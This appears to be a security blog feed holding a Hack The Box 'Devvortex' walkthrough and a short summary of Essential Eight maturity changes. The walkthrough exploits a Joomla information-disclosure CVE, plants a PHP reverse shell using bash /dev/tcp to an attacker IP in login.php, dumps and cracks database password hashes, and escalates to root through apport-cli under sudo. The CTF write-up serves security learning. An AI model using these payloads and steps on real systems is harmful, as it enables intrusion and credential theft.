</code></pre></div></div> <p>Switching to <code class="language-plaintext highlighter-rouge">root</code> and trying the password works, and the root flag is obtained.</p> <p><img src="/assets/img/20240123-bizness/20240123-rootflag.png" alt="20240123-rootflag.png" class="auto-resize"/></p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="SSRF"/><category term="authentication-bypass"/><category term="persistence"/><category term="linpeas"/><summary type="html"><![CDATA[Bizness - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Devvortex</title><link href="https://emdeh.github.io/blog/2024/devvortex-walkthrough/" rel="alternate" type="text/html" title="Devvortex"/><published>2024-01-15T14:14:00+00:00</published><updated>2024-01-15T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/devvortex-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/devvortex-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Devvortex is an easy Linux box. It involves enumerating a domain to reveal a Content Management System called <em>Joomla</em>.</p> <p>An exploit is then used to perform an <strong>Unauthenticated Information Disclosure.</strong></p> <p>This results in stealing MySQL credentials which are <strong>re-used</strong> to authenticate to the Joomla admin panel.</p> <p>From there a reverse shell is obtained by modifying the <code class="language-plaintext highlighter-rouge">login.php</code>. Once the reverse shell is established the MySQL database is enumerated to obtain two hashes. Once a hash is cracked, SSH is used to log on.</p> <p><strong>Privilege escalation</strong> is achieved by exploiting a vulnerability in the <code class="language-plaintext highlighter-rouge">apport-cli</code> utility, which the user has <code class="language-plaintext highlighter-rouge">sudo</code> rights over. This ultimately spawns a privileged shell.</p> <h2 id="methods">Methods</h2> <h3 id="unauthenticated-information-disclosure">Unauthenticated information disclosure</h3> <p>Unauthenticated Information Disclosure refers to a security vulnerability where sensitive information is exposed without requiring authentication. It means that confidential data, such as personal details, configuration files, or database records, can be accessed by anyone without needing to log in or bypass security controls.</p> <p>This type of vulnerability often arises due to misconfigurations or flawed programming in web applications or services. It poses a significant risk because it can lead to data breaches and further exploitation.</p> <p>In this case, an outdated Joomla version was exploited to obtain clear-text credentials.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure sensitive information is not vulnerable to unauthenticated disclosure, keep systems patched, and encrypt sensitive data.</p> </blockquote> <h3 id="credential-stuffing">Credential stuffing</h3> <p>Credential stuffing is a type of attack where stolen account credentials (usernames or email addresses and passwords) from one breach are used to attempt access to accounts on other websites. This attack relies on the fact that many people reuse the same login credentials across multiple sites. It’s a widespread method for gaining unauthorised access due to the commonality of password reuse.</p> <p>In this case, the credentials from the information disclosure were re-used to obtain access to the Joomla administrator panel.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure passwords are not re-used across different services.</p> </blockquote> <h3 id="password-cracking">Password cracking</h3> <p>Password cracking is the process of attempting to gain unauthorised access to restricted systems by figuring out the password. It often involves the use of software that employs various methods (like brute-force attacks, dictionary attacks, or rainbow table attacks) to guess passwords. This technique can be used against individual accounts or to decrypt encrypted data. The complexity and time it takes to crack a password can vary significantly based on the password’s strength and the method used.</p> <p>In this case, the hashes stolen from the MySQL database were cracked with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p> <p><strong>Mitigation:</strong> Ensure complex passwords are used.</p> <h1 id="enumeration">Enumeration</h1> <p>Enumeration, as always starts with Nmap.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.15.24 <span class="nt">-oN</span> - | <span class="nb">tee </span>devvortex-initial-scan.txt
</code></pre></div></div> <blockquote> <p><em>To output Nmap scan results to a file while also displaying them in the terminal, you can use the <code class="language-plaintext highlighter-rouge">-oN</code> option along with the <code class="language-plaintext highlighter-rouge">tee</code> command in Linux. The <code class="language-plaintext highlighter-rouge">-oN</code> option in Nmap is used to output the scan results to a file in a normal, human-readable format. The <code class="language-plaintext highlighter-rouge">tee</code> command in Unix-like operating systems reads from standard input and writes to both standard output and one or more files simultaneously.</em></p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Sun Jan 14 23:30:42 2024 as: nmap -sC -sV -oN - 10.129.15.24
Nmap scan report for 10.129.15.24
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 23:31:37 2024 -- 1 IP address (1 host up) scanned in 54.86 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Two ports open, 22 and 80.</li> <li>Domain name http://devvortex.htb/ found.</li> </ol> <h2 id="subdomain-scanning">Subdomain scanning</h2> <p>Adding the domain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file allows for the site to be browsed and reveals a landing page.</p> <p><img src="/assets/img/20240115-devvortext-landingpage1.png" alt="20240115-devvortext-landingpage1.png" class="auto-resize"/></p> <p>The site was then scanned for subdomains.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> http://devvortex.htb/ <span class="nt">-H</span> <span class="s1">'Host:FUZZ.devvortex.htb'</span> <span class="nt">-t</span> 50 <span class="nt">--hc</span> 302 <span class="o">&gt;</span> subdomain-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <ul> <li>The <code class="language-plaintext highlighter-rouge">-t 50</code> instructs wfuzz to have up to 50 concurrent connections which will speed up the scan.</li> <li>The <code class="language-plaintext highlighter-rouge">--hc 302</code> flag stands for “Hide Code”. This option instructs wfuzz not to display results with the 302 status code. This can be helpful to filter out some of the redirection noise.</li> </ul> <h3 id="findings-1">Findings</h3> <p>The subdomain <code class="language-plaintext highlighter-rouge">dev</code> was identified.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                           

Total time: 0
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 0
</code></pre></div></div> <p>This is added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to allow the site to be browsed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/scans]
└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
&lt;SNIP&gt;
10.129.15.24    devvortex.htb dev.devvortex.htb
</code></pre></div></div> <p>Navigating to the subdomain reveals another landing page.</p> <p><img src="/assets/img/20240115-devvortext-cover-landingpage2.png" alt="20240115-devvortext-cover-landingpage2.png" class="auto-resize"/></p> <h2 id="subdomain-directory-scanning">Subdomain directory scanning</h2> <p>The newly identified subdomain <code class="language-plaintext highlighter-rouge">dev.devvortex.htb</code> can be fuzzed again for pages.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt <span class="nt">-u</span> http://dev.devvortex.htb/FUZZ <span class="nt">-t</span> 200 <span class="nt">--hc</span> 404,403 <span class="o">&gt;</span> subdomain-directory-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <h3 id="findings-2">Findings</h3> <p>The fuzzing revealed a number of directories on the subdomain. Lets start with the <code class="language-plaintext highlighter-rouge">administrator</code> directory.</p> <p><img src="/assets/img/20240115-devvortext-domainfuzzing.png" alt="20240115-devvortext-domainfuzzing.png" class="auto-resize"/></p> <p>Navigating to the <code class="language-plaintext highlighter-rouge">/administrator</code> page reveals a <strong>Joomla</strong> landing page.</p> <p><img src="/assets/img/20240115-devvortext-joomlapage.png" alt="20240115-devvortext-joomlapage.png" class="auto-resize"/></p> <h3 id="what-is-joomla">What is Joomla</h3> <p>Joomla is a popular, open-source Content Management System (CMS) used to build, manage, and publish content for websites, blogs, and online applications. It is written in PHP and uses a <strong>MySQL</strong> database to store content and settings.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="joomla-compromise">Joomla compromise</h2> <p>Checking the subdomain’s README.txt file reveals the Joomla version as 4.2.</p> <p>A quick search of <code class="language-plaintext highlighter-rouge">searchsploit</code> and we find a promising exploit.</p> <p><img src="/assets/img/20240115-devvortext-joomlaexploit.png" alt="20240115-devvortext-joomlaexploit.png" class="auto-resize"/></p> <p>Using the <code class="language-plaintext highlighter-rouge">mirror</code> command the exploit can be copied to a working directory.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/51334.py
</code></pre></div></div> <p>This exploit ran into some library issues so another version on GitHub was used: https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752</p> <p>The exploit executed successfully and identified two users, site details and database information including credentials.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ ./CVE-2023-23752 http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

</code></pre></div></div> <p>Password stuffing Lewis’ credentials on the <code class="language-plaintext highlighter-rouge">/administrator</code> page resulted in a successful authentication.</p> <p>Checking SSH with Lewis’ credentials revealed no further credential re-use.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>ssh lewis@10.129.15.24        
lewis@10.129.15.24<span class="s1">'s password: 
Permission denied, please try again.
lewis@10.129.15.24'</span>s password: 
</code></pre></div></div> <h2 id="foothold---php-reverse-shell">Foothold - PHP reverse shell</h2> <p>On the admin panel is a warning about the server using an outdated version of PHP.</p> <p><img src="/assets/img/20240115-devvortext-phpwarning.png" alt="20240115-devvortext-phpwarning.png" class="auto-resize"/></p> <p>Moving to <code class="language-plaintext highlighter-rouge">/System/Templates/Administrator Templates</code>, it was identified that the user has access to the PHP templates. The <code class="language-plaintext highlighter-rouge">login.php</code> was edited to send a reverse shell when the page is served.</p> <p>The modification made was:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 00&gt;&amp;1"'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">system()</code> <em>Function in PHP</em>: This is a PHP function that is used to execute an external program. The <code class="language-plaintext highlighter-rouge">system</code> function will execute the given command and output the result. In this context, it is being used to execute a bash command.</li> <li><code class="language-plaintext highlighter-rouge">bash -c</code>: This tells the system to execute the following string with Bash.</li> <li><code class="language-plaintext highlighter-rouge">"bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 0&lt;&amp;1"</code>: This is the string command that Bash executes.</li> <li><code class="language-plaintext highlighter-rouge">bash -i</code>: This starts an interactive Bash shell (<code class="language-plaintext highlighter-rouge">-i</code> flag for interactive).</li> <li><code class="language-plaintext highlighter-rouge">&gt;&amp; /dev/tcp/10.10.14.16/4321</code>: This redirects the standard output (stdout) of the shell to a TCP connection to the specified IP address and port.</li> <li><code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code>: This part redirects the standard input (stdin) to the shell from the same TCP connection. The <code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code> means to take input (file descriptor 0) from the same place as the standard output (file descriptor 1).</li> </ul> <blockquote> <p><em>The <code class="language-plaintext highlighter-rouge">&gt;&amp;</code> operator is shorthand for redirecting both stdout (1) and stderr (2).</em></p> </blockquote> <p><img src="/assets/img/20240115-devvortext-revshell.png" alt="20240115-devvortext-revshell.png" class="auto-resize"/></p> <p>Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4321
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.15.24] 45554
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>856<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@devvortex:~/dev.devvortex.htb/administrator<span class="nv">$ </span>

</code></pre></div></div> <h3 id="shell-stabilisation">Shell stabilisation</h3> <p>Now the shell can be stabilised before proceeding.</p> <p><img src="/assets/img/20240115-devvortext-shellupgrade.png" alt="20240115-devvortext-shellupgrade.png" class="auto-resize"/></p> <p>As shown above, running these commands sequentially, and then hitting enter a few times, will return a more interactive and stable shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>  
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm  
ctrl + z  
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div> <p>The sequence of commands will upgrade a basic shell into a fully interactive shell. This is often necessary because simple reverse shells can be quite limited (e.g., no tab completion, no interactive commands). Here’s a brief explanation of each step:</p> <ol> <li><code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>: <ul> <li>This command uses Python to spawn a new bash shell with pseudo-terminal (pty) support. This improves the shell’s interactivity and handling of certain commands.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">export TERM=xterm</code>: <ul> <li>After the Python command gives you a more functional shell, set the <code class="language-plaintext highlighter-rouge">TERM</code> environment variable to <code class="language-plaintext highlighter-rouge">xterm</code>. This tells the shell what kind of terminal it’s running in, allowing for better formatting and functionality (like clear screen, command history).</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">Ctrl + Z</code>: <ul> <li>This key combination suspends the current foreground process (the shell), returning control to your local terminal without closing the shell.</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code>: <ul> <li><code class="language-plaintext highlighter-rouge">stty raw -echo</code>: This configures the terminal. <code class="language-plaintext highlighter-rouge">raw</code> mode means input characters are passed to the foreground process immediately, and <code class="language-plaintext highlighter-rouge">-echo</code> turns off input echoing, preventing characters from being displayed twice.</li> <li><code class="language-plaintext highlighter-rouge">fg</code>: This command brings the suspended process (your bash shell) back to the foreground.</li> </ul> </li> <li><strong>Hit Enter a Few Times</strong>: <ul> <li>Sometimes, after running these commands, you might need to hit enter a few times to get the prompt of the interactive shell.</li> </ul> </li> </ol> <h2 id="lateral-movement---mysql">Lateral movement - MySQL</h2> <p>Recall the credentials found with the Joomla exploit earlier:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
</code></pre></div></div> <p>Trying them on the reverse shell is successful.</p> <pre><code class="language-mysql">mysql -h localhost -u lewis -p '&lt;REDACTED&gt;'
</code></pre> <pre><code class="language-mysql">www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8889
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;  
+-------------------------------+  
| Tables_in_joomla |  
+-------------------------------+  
| sd4fg_action_log_config |  
| sd4fg_action_logs |  
| sd4fg_action_logs_extensions |  
| sd4fg_action_logs_users |  
| sd4fg_assets |  
| sd4fg_associations |  
| sd4fg_banner_clients |  
| sd4fg_banner_tracks |
&lt;SNIP&gt;
| sd4fg_users |

mysql&gt; select * from sd4fg_users;  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis | lewis | lewis@devvortex.htb | &lt;REDACTED&gt; | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0 | | NULL | 0 | | | 0 | |  
| 650 | logan paul | logan | logan@devvortex.htb | &lt;REDACTED&gt; | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | | 0 | |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

</code></pre> <p>As shown above, two hashes were stolen from the database.</p> <p><img src="/assets/img/20240115-devvortext-sqlhashes.png" alt="20240115-devvortext-sqlhashes.png" class="auto-resize"/></p> <h2 id="cracking-the-passwords">Cracking the passwords</h2> <p>Using Hashcat, one of the hashes is quickly cracked.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/credentials]
└─<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 hashes /usr/share/wordlists/rockyou.txt       
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
&lt;SNIP&gt;
&lt;REDACTED&gt;

</code></pre></div></div> <p>This hash corresponds to the user <code class="language-plaintext highlighter-rouge">logan</code>.</p> <h2 id="ssh">SSH</h2> <p>Trying the password on SSH is successful.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
└─$ ssh logan@10.129.15.24
logan@10.129.15.24's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 15 Jan 2024 06:46:03 AM UTC

  System load:           0.0
  Usage of /:            64.2% of 4.76GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             177
  Users logged in:       0
  IPv4 address for eth0: 10.129.15.24
  IPv6 address for eth0: dead:beef::250:56ff:fe96:b12d

  =&gt; There are 8 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ 

</code></pre></div></div> <p>Grab the first flag!</p> <p><img src="/assets/img/20240115-devvortext-userflag.png" alt="20240115-devvortext-userflag.png" class="auto-resize"/></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> lists the binaries <code class="language-plaintext highlighter-rouge">logan</code> can run with root privileges.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>logan@devvortex:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>logan on devvortex:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User logan may run the following commands on devvortex:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/apport-cli

</code></pre></div></div> <p>We can see here that <code class="language-plaintext highlighter-rouge">logan</code> can run <code class="language-plaintext highlighter-rouge">/usr/bin/apport-cli</code>.</p> <h2 id="what-is-apport-cli">What is apport-cli</h2> <p><code class="language-plaintext highlighter-rouge">apport-cli</code> is a command-line interface tool for Apport, which is a system in Ubuntu and other Debian-based Linux distributions used for reporting bugs and crashes. Apport automatically generates crash reports when a program fails and helps in debugging the causes of those failures. These reports can include details like the state of the program at the time of the crash, which can be invaluable for developers to diagnose and fix issues.</p> <p>A key feature of the utility is a <strong>Command-Line Interface</strong>. As a CLI tool, <code class="language-plaintext highlighter-rouge">apport-cli</code> allows users to interact with the Apport crash reporting system directly from the terminal. This is particularly useful for servers or other systems where a graphical user interface (GUI) is not available.</p> <h2 id="exploiting-apport-cli">Exploiting apport-cli</h2> <p>The help menu reveals a number of options.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: apport-cli <span class="o">[</span>options] <span class="o">[</span>symptom|pid|package|program path|.apport/.crash file]

Options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-f</span>, <span class="nt">--file-bug</span>        Start <span class="k">in </span>bug filing mode. Requires <span class="nt">--package</span> and an
                        optional <span class="nt">--pid</span>, or just a <span class="nt">--pid</span><span class="nb">.</span> If neither is given,
                        display a list of known symptoms. <span class="o">(</span>Implied <span class="k">if </span>a single
                        argument is given.<span class="o">)</span>
  <span class="nt">-w</span>, <span class="nt">--window</span>          Click a window as a target <span class="k">for </span>filing a problem
                        report.
  <span class="nt">-u</span> UPDATE_REPORT, <span class="nt">--update-bug</span><span class="o">=</span>UPDATE_REPORT
                        Start <span class="k">in </span>bug updating mode. Can take an optional
                        <span class="nt">--package</span><span class="nb">.</span>
  <span class="nt">-s</span> SYMPTOM, <span class="nt">--symptom</span><span class="o">=</span>SYMPTOM
                        File a bug report about a symptom. <span class="o">(</span>Implied <span class="k">if </span>symptom
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-p</span> PACKAGE, <span class="nt">--package</span><span class="o">=</span>PACKAGE
                        Specify package name <span class="k">in</span> <span class="nt">--file-bug</span> mode. This is
                        optional <span class="k">if </span>a <span class="nt">--pid</span> is specified. <span class="o">(</span>Implied <span class="k">if </span>package
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-P</span> PID, <span class="nt">--pid</span><span class="o">=</span>PID     Specify a running program <span class="k">in</span> <span class="nt">--file-bug</span> mode. If this
                        is specified, the bug report will contain more
                        information.  <span class="o">(</span>Implied <span class="k">if </span>pid is given as only
                        argument.<span class="o">)</span>
  <span class="nt">--hanging</span>             The provided pid is a hanging application.
  <span class="nt">-c</span> PATH, <span class="nt">--crash-file</span><span class="o">=</span>PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones <span class="k">in</span> /var/crash. <span class="o">(</span>Implied <span class="k">if
                        </span>file is given as only argument.<span class="o">)</span>
  <span class="nt">--save</span><span class="o">=</span>PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        <span class="k">then </span>be reported later on from a different machine.
  <span class="nt">--tag</span><span class="o">=</span>TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  <span class="nt">-v</span>, <span class="nt">--version</span>         Print the Apport version number.

</code></pre></div></div> <p>With <code class="language-plaintext highlighter-rouge">sudo /usr/bin/apport-cli -f</code> the utility enters the <strong>File a bug</strong> mode to first attempt submitting a bug to understand how the utility works.</p> <p>At the end, of the submission is an option to view the report.</p> <p><img src="/assets/img/20240115-devvortext-apportuse.png" alt="20240115-devvortext-apportuse.png" class="auto-resize"/></p> <p>The screen that follows opens in a <code class="language-plaintext highlighter-rouge">vim</code> style editor.</p> <p><img src="/assets/img/20240115-devvortext-apportshell.png" alt="20240115-devvortext-apportshell.png" class="auto-resize"/></p> <p>Passing a shell to it by typing <code class="language-plaintext highlighter-rouge">!/bin/bash</code> may, theoretically, launch a new shell under the sudo privileges from which the utility is being ran.</p> <p>and it does!</p> <p><img src="/assets/img/20240115-devvortext-rootflag.png" alt="20240115-devvortext-rootflag.png" class="auto-resize"/></p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="credential-stuffing"/><category term="information-disclosure"/><category term="password-cracking"/><summary type="html"><![CDATA[Devvortex - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Essential Eight Maturity Model annual update</title><link href="https://emdeh.github.io/blog/2023/update-to-essential-eight/" rel="alternate" type="text/html" title="Essential Eight Maturity Model annual update"/><published>2023-11-27T16:00:00+00:00</published><updated>2023-11-27T16:00:00+00:00</updated><id>https://emdeh.github.io/blog/2023/update-to-essential-eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/update-to-essential-eight/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>As mentioend in <a href="https://emdeh.com/news/announcement_7"> this news item</a>, the updates draw upon various sources, including cyber threat intelligence, feedback from government and industry sectors globally, insights from penetration tests, Essential Eight assessments, uplift activities, and responses to ASD’s annual cyber survey.</p> <p>Key areas of focus in the latest update include:</p> <ol> <li>Balancing patching timeframes to ensure timely response to vulnerabilities.</li> <li>Increasing the adoption of phishing-resistant multifactor authentication to enhance security.</li> <li>Improving the management of cloud services, considering their growing importance and unique security challenges.</li> <li>Enhancing incident detection and response capabilities, particularly for internet-facing infrastructure, to quickly identify and mitigate potential breaches.</li> </ol> <p>The following summarises the for each maturity level.</p> <h2 id="maturity-level-one-updates">Maturity Level One updates</h2> <ol> <li>Patch Applications: Tightens response times for critical vulnerabilities and increases frequency of vulnerability scanning for high-risk software.</li> <li>Patch Operating Systems: Similar changes as for applications, emphasizing quicker responses for critical vulnerabilities.</li> <li>Multi-Factor Authentication (MFA): Removes opt-out option for certain online services and adds new requirements for MFA implementation.</li> <li>Restrict Administrative Privileges: Introduces validation for privileged access requests and limits internet access for privileged accounts.</li> <li>Application Control: Shifts from using NTFS permissions to employing application control solutions.</li> <li>User Application Hardening: Focuses on disabling or removing Internet Explorer 11 and logging command line process creation events.</li> <li>Regular Backups: No significant change.</li> </ol> <h2 id="maturity-level-two-updates">Maturity Level Two updates</h2> <p>Maturity Level Two implements the same changes as Level One, with additional changes:</p> <ol> <li>Phishing-resistant MFA for various user authentication scenarios.</li> <li>Centralised event log retention and monitoring for signs of compromise.</li> <li>Mandatory incident reporting and response plan enactment.</li> <li>Application control rule validation and Microsoft’s recommended application blocklist implementation.</li> </ol> <h2 id="maturity-level-three-udpates">Maturity Level Three udpates</h2> <p>Level Three includes Level One and Two changes, with the following additional requirements:</p> <ol> <li>Additional requirements for patching drivers and firmware.</li> <li>Enhanced administrative privilege restrictions, including the use of Secure Admin Workstations and enhanced Windows security features.</li> <li>Specific requirements for handling Microsoft Office macros, including digital signing and checking for malicious code.</li> </ol> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model-changes"> Essential Eight Maturity Model Changes</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[The November 2023 update of the Essential Eight Maturity Model introduces several changes across three maturity levels.]]></summary></entry><entry><title type="html">Assessment planning and scoping</title><link href="https://emdeh.github.io/blog/2023/assessment-planning-scoping/" rel="alternate" 